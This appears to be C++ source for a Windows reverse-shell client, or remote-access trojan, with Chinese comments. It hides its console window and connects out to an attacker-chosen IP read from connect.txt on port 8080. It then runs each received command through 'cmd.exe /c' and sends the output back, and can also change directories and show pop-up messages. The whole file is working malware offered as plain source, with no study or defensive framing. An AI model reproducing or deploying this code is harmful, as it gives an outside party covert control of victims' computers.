#include <bits/stdc++.h>
#include <stdbool.h>
#include <winsock2.h>  
#include<windows.h>
#include<unistd.h>
#define PORT 8080
//#error 请设定服务器IP再编译
#define  BUFFER_SIZE 4196
using namespace std;
const char* kExitFlag = "exit";
/// 执行cmd指令并返回结果
char SERVER_IP[256];
void get_ip(){
	ifstream fin ("connect.txt");
	fin>>SERVER_IP;
	fin.close();
}
string getCmdResult(const char* strCmd)  
{
	char buf[10240] = {0};
	FILE *pf = NULL;
	
	if( (pf = popen(strCmd, "r")) == NULL )
	{
		return "";
	}
	
	string strResult;
	while(fgets(buf, sizeof buf, pf))
	{
		strResult += buf;
	}
	
	pclose(pf);
	return strResult;
}
int main() {
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	get_ip();
	// 初始化socket dll。
	WORD winsock_version = MAKEWORD(2,2);
	WSADATA wsa_data;
	if (WSAStartup(winsock_version, &wsa_data) != 0) {
		printf("Failed to init socket!\n");
		return 0;
	}
	
	SOCKET client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (client_socket == INVALID_SOCKET) {
		printf("Failed to create server socket!\n");
		return 0;
	}
	
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	server_addr.sin_addr.S_un.S_addr = inet_addr(SERVER_IP);
	if (connect(client_socket, (LPSOCKADDR)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		printf("Failed to connect server: %ld !\n", GetLastError());
		return 0;
	}
	
	char recv_data[BUFFER_SIZE+1];
	const char * send_data;
	char ch[10240]={'\0'};
	while (true) {
		sprintf(ch,"");
		int ret = recv(client_socket, recv_data, BUFFER_SIZE, 0);
		if (ret < 0) {
			printf("Failed to receive data!\n");
			return 0;
		}
		recv_data[ret]=0; // correctly ends received string
		if(recv_data[0]=='m'&&recv_data[1]=='s'&&recv_data[2]=='g'){
			for(int i=4;i<strlen(recv_data);i++){
				ch[i-4]=recv_data[i];
			}
			MessageBox(GetForegroundWindow(),ch,"Info",MB_OK);
			send(client_socket, "Message send successfully.", strlen("Message send successfully."), 0);
			for(int i=0;i<strlen(recv_data)-4;i++){
				ch[i]='\0';
			}
		}else if(recv_data[0]=='c'&&recv_data[1]=='d'){
			for(int i=3;i<strlen(recv_data);i++){
				ch[i-3]=recv_data[i];
			}
			chdir(ch);
			char* ch1;
			ch1=getcwd(NULL,0);
			send(client_socket, ch1, strlen(ch1), 0);
			for(int i=0;i<strlen(recv_data)-3;i++){
				ch[i]='\0';
			}
		}else if(recv_data[0]=='e'&&recv_data[1]=='x'&&recv_data[2]=='i'&&recv_data[3]=='t'){
			return 0;
		}else{
			sprintf(ch,"cmd.exe /c %s",recv_data);
			string s=getCmdResult(ch);
			if(s==""){
				send_data="无返回内容";
			}else{
				for(int i=0;i<strlen(recv_data)+20;i++){
					ch[i]='\0';
				}
				for(int i=0;i<s.size();i++){
					ch[i]=s[i];
				}
				send_data=ch;
			}
			send(client_socket, send_data, strlen(send_data), 0);
			for(int i=0;i<s.size();i++){
				ch[i]='\0';
			}
		}
	}
	
	closesocket(client_socket);
	WSACleanup();
	
	return 0;
}
